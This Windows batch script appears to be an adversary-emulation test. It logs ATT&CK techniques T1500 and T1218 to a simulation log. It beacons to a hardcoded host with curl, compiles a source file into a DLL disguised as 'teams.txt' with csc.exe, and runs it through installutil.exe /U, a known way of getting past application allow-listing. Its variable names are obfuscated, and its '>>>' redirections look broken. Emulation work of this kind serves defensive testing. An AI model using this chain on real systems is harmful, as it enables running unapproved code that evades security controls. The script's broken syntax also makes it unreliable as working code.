@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET recnn=%APPDATA%\8195\aee82878
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?8195-7
SET lqyereup=ITZEL-S2BS
SET ufeybybm=7
SET hpnjatpj=teams.txt
SET njozco=file.txt
SET kkjwr=8195

REM Computed values
SET vqnxr=%APPDATA%\!ufeybybm!
SET cnixd=%vqnxr%\macula-simulations.log
SET uakpq=csc.exe
SET euvvb=installutil.exe

REM --- T1500: Compile After Delivery ---
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: TTP_T1500_start>>> "!cnixd!" 2>nul

SET jfvff=1
SET mdvne=

REM Step 1: Heartbeat check (not a TTP)
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_start=!uouoq!>>> "!cnixd!" 2>nul
curl -k -s -o nul "!uouoq!"
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_complete>>> "!cnixd!" 2>nul

REM Step 2: Change directory
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir_start=!recnn!>>> "!cnixd!" 2>nul
cd /d "!recnn!" 2>nul
if not !errorlevel!==0 (
    SET jfvff=0
    SET mdvne=chdir_failed
)
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir_complete>>> "!cnixd!" 2>nul

REM Step 3: Locate compiler
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: locate_compiler=!uakpq!>>> "!cnixd!" 2>nul
where !uakpq! >nul 2>nul
if not !errorlevel!==0 (
    SET jfvff=0
    SET mdvne=compiler_not_found
)

REM Step 4: Compile DLL
if !jfvff!==1 (
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compile_start=!njozco!>>> "!cnixd!" 2>nul
    !uakpq! /target:library /reference:System.Configuration.Install.dll /out:"!hpnjatpj!" "!njozco!" >nul 2>nul
    if not !errorlevel!==0 (
        SET jfvff=0
        SET mdvne=compile_failed
    )
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compile_complete>>> "!cnixd!" 2>nul
)

REM Log T1500
for /f "tokens=1-3 delims=/- " %%a in ("!date!") do set yyyy=%%c
for /f "tokens=1-3 delims=/- " %%a in ("!date!") do set mm=%%a
for /f "tokens=1-3 delims=/- " %%a in ("!date!") do set dd=%%b
if "!mm:~0,1!"==" " set mm=0!mm:~1!
if "!dd:~0,1!"==" " set dd=0!dd:~1!
set hh=!time:~0,2!
if "!hh:~0,1!"==" " set hh=0!hh:~1!
set timestamp=!yyyy!-!mm!-!dd! !hh!:!time:~3,2!:!time:~6,2!.!time:~9,3!

(echo [!timestamp!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|Compile After Delivery=!jfvff!:!mdvne!) >> "!cnixd!" 2>nul

REM --- T1218: Signed Binary Proxy Execution ---
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: TTP_T1218_start>>> "!cnixd!" 2>nul

SET smwam=1
SET ecnnp=

REM Step 5: Locate installutil
if !jfvff!==1 (
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: locate_installutil=!euvvb!>>> "!cnixd!" 2>nul
    where !euvvb! >nul 2>nul
    if not !errorlevel!==0 (
        SET smwam=0
        SET ecnnp=installutil_not_found
    )
)

REM Step 6: Execute via installutil
if !smwam!==1 (
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: exec_start=!euvvb!>>> "!cnixd!" 2>nul
    !euvvb! /logfile= /LogToConsole=false /U "!hpnjatpj!" >nul 2>nul
    if not !errorlevel!==0 (
        SET smwam=0
        SET ecnnp=execution_failed
    )
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: exec_complete>>> "!cnixd!" 2>nul
)

REM Log T1218
for /f "tokens=1-3 delims=/- " %%a in ("!date!") do set yyyy=%%c
for /f "tokens=1-3 delims=/- " %%a in ("!date!") do set mm=%%a
for /f "tokens=1-3 delims=/- " %%a in ("!date!") do set dd=%%b
if "!mm:~0,1!"==" " set mm=0!mm:~1!
if "!dd:~0,1!"==" " set dd=0!dd:~1!
set hh=!time:~0,2!
if "!hh:~0,1!"==" " set hh=0!hh:~1!
set timestamp=!yyyy!-!mm!-!dd! !hh!:!time:~3,2!:!time:~6,2!.!time:~9,3!

(echo [!timestamp!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|Signed Binary Proxy Execution=!smwam!:!ecnnp!) >> "!cnixd!" 2>nul

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: script_complete>>> "!cnixd!" 2>nul
ENDLOCAL